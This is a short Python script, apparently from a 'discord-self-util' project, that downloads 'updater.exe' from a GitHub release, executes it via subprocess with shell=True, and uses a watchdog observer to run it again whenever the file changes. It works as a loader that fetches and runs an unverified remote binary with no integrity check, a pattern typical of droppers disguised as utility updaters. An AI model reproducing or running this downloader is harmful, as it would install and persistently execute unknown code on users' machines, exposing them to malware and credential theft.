import os
import requests
import subprocess
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler



class ExeFileHandler(FileSystemEventHandler):
    def __init__(self, exe_path):
        super().__init__()
        self.exe_path = exe_path

    def on_modified(self, event):
        if event.src_path == self.exe_path:
            subprocess.run([self.exe_path], shell=True)

def download_exe(repo_url, exe_filename):
    try:
        response = requests.get(repo_url)
        response.raise_for_status()

        script_dir = os.path.dirname(__file__)
        download_path = os.path.join(script_dir, exe_filename)
        
        with open(download_path, 'wb') as exe_file:
            exe_file.write(response.content)
        
        return download_path
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

if __name__ == "__main__":
    github_url = "https://github.com/allcreator00/discord-self-util/releases/download/updater/updater.exe"
    exe_filename = "updater.exe"

    download_path = download_exe(github_url, exe_filename)

    if download_path:
        subprocess.run([download_path], shell=True)

        handler = ExeFileHandler(download_path)
        observer = Observer()
        observer.schedule(handler, path=os.path.dirname(download_path), recursive=False)
        observer.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            observer.stop()

        observer.join()